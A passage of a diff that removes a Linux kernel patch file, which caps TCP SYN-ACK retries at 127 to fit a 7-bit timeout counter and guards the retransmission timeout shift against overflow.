-+	be retransmitted. Should not be higher than 127. Default value
- 	is 5, which corresponds to 31seconds till the last retransmission
- 	with the current initial RTO of 1second. With this the final timeout
- 	for a passive TCP connection will happen after 63seconds.
-diff --git a/include/net/request_sock.h b/include/net/request_sock.h
-index 5a9c826a7092d..a9781fab774aa 100644
---- a/include/net/request_sock.h
-+++ b/include/net/request_sock.h
-@@ -58,12 +58,17 @@ struct request_sock {
- 	struct request_sock		*dl_next;
- 	u16				mss;
- 	u8				num_retrans; /* number of retransmits */
--	u8				syncookie:1; /* True if
-+	union {
-+		struct {
-+			u8		syncookie:1; /* True if
- 						      * 1) tcpopts needs to be encoded in
- 						      *    TS of SYN+ACK
- 						      * 2) ACK is validated by BPF kfunc.
- 						      */
--	u8				num_timeout:7; /* number of timeouts */
-+			u8		num_timeout:7; /* number of timeouts */
-+		};
-+		u8		num_timeout_syncookie;
-+	};
- 	u32				ts_recent;
- 	struct timer_list		rsk_timer;
- 	const struct request_sock_ops	*rsk_ops;
-@@ -74,6 +79,17 @@ struct request_sock {
- 	u32				timeout;
- };
- 
-+static inline u8 reqsk_num_timeout(const struct request_sock *req)
-+{
-+	u8 num_timeout = READ_ONCE(req->num_timeout_syncookie);
-+
-+#if defined(__LITTLE_ENDIAN_BITFIELD)
-+	return num_timeout >> 1;
-+#else
-+	return num_timeout & 0x7f;
-+#endif
-+}
-+
- static inline struct request_sock *inet_reqsk(const struct sock *sk)
- {
- 	return (struct request_sock *)sk;
-diff --git a/include/net/tcp.h b/include/net/tcp.h
-index 2c5b889530b55..b4054aa53b7c7 100644
---- a/include/net/tcp.h
-+++ b/include/net/tcp.h
-@@ -183,6 +183,8 @@ static_assert((1 << ATO_BITS) > TCP_DELACK_MAX);
- #define MAX_TCP_KEEPINTVL	32767
- #define MAX_TCP_KEEPCNT		127
- #define MAX_TCP_SYNCNT		127
-+/* request_sock::num_timeout is a 7-bit field. */
-+#define MAX_TCP_SYNACK_RETRIES	127
- 
- /* Ensure that TCP PAWS checks are relaxed after ~2147 seconds
-  * to avoid overflows. This assumes a clock smaller than 1 Mhz.
-@@ -882,12 +884,23 @@ static inline u32 __tcp_set_rto(const struct tcp_sock *tp)
- 	return usecs_to_jiffies((tp->srtt_us >> 3) + tp->rttvar_us);
- }
- 
--static inline unsigned long tcp_reqsk_timeout(struct request_sock *req)
-+static inline unsigned long tcp_reqsk_timeout_sk(const struct sock *sk,
-+						 struct request_sock *req)
- {
--	u64 timeout = (u64)req->timeout << req->num_timeout;
-+	u64 timeout = READ_ONCE(req->timeout);
-+	u32 rto_max = tcp_rto_max(sk);
-+	u8 num_timeout = reqsk_num_timeout(req);
-+
-+	if (num_timeout >= BITS_PER_TYPE(timeout) ||
-+	    timeout > U64_MAX >> num_timeout)
-+		return rto_max;
-+
-+	return (unsigned long)min_t(u64, timeout << num_timeout, rto_max);
-+}
- 
--	return (unsigned long)min_t(u64, timeout,
--				    tcp_rto_max(req->rsk_listener));
-+static inline unsigned long tcp_reqsk_timeout(struct request_sock *req)
-+{
-+	return tcp_reqsk_timeout_sk(req->rsk_listener, req);
- }
- 
- u32 tcp_delack_max(const struct sock *sk);
-diff --git a/net/ipv4/inet_connection_sock.c b/net/ipv4/inet_connection_sock.c
-index 56902bba54838..a5f6ad0f0ea1f 100644
---- a/net/ipv4/inet_connection_sock.c
-+++ b/net/ipv4/inet_connection_sock.c
-@@ -1085,6 +1085,8 @@ static void reqsk_timer_handler(struct timer_list *t)
- 			young <<= 1;
- 		}
- 	}
-+	max_syn_ack_retries = min_t(int, max_syn_ack_retries,
-+				    MAX_TCP_SYNACK_RETRIES);
- 
- 	syn_ack_recalc(req, max_syn_ack_retries, READ_ONCE(queue->rskq_defer_accept),
- 		       &expire, &resend);
-diff --git a/net/ipv4/tcp.c b/net/ipv4/tcp.c
-index 455441f1b6949..24896fa08a5d8 100644
---- a/net/ipv4/tcp.c
-+++ b/net/ipv4/tcp.c
-@@ -357,7 +357,7 @@ static u8 secs_to_retrans(int seconds, int timeout, int rto_max)
- 		int period = timeout;
- 
- 		res = 1;
--		while (seconds > period && res < 255) {
-+		while (seconds > period && res < MAX_TCP_SYNACK_RETRIES) {
- 			res++;
- 			timeout <<= 1;
- 			if (timeout > rto_max)
-diff --git a/net/ipv4/tcp_timer.c b/net/ipv4/tcp_timer.c
-index bf171b5e1eb30..daa4eac072dd9 100644
---- a/net/ipv4/tcp_timer.c
-+++ b/net/ipv4/tcp_timer.c
-@@ -462,11 +462,13 @@ static void tcp_fastopen_synack_timer(struct sock *sk, struct request_sock *req)
- 
- 	tcp_syn_ack_timeout(req);
- 
--	/* Add one more retry for fastopen.
-+	/* Add one more retry for fastopen when the timeout counter can
-+	 * represent it.
- 	 * Paired with WRITE_ONCE() in tcp_sock_set_syncnt()
- 	 */
- 	max_retries = READ_ONCE(icsk->icsk_syn_retries) ? :
- 		READ_ONCE(sock_net(sk)->ipv4.sysctl_tcp_synack_retries) + 1;
-+	max_retries = min_t(int, max_retries, MAX_TCP_SYNACK_RETRIES);
- 
- 	if (req->num_timeout >= max_retries) {
- 		tcp_write_err(sk);
-@@ -488,7 +490,7 @@ static void tcp_fastopen_synack_timer(struct sock *sk, struct request_sock *req)
- 	if (!tp->retrans_stamp)
- 		tp->retrans_stamp = tcp_time_stamp_ts(tp);
- 	tcp_reset_xmit_timer(sk, ICSK_TIME_RETRANS,
--			  req->timeout << req->num_timeout, false);
-+			     tcp_reqsk_timeout_sk(sk, req), false);
- }
- 
- static bool tcp_rtx_probe0_timed_out(const struct sock *sk,
 -- 
 2.43.0
+
